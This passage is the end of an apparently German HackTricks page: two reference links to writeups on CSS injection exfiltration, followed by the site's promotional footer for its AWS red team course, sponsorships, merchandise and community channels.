* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
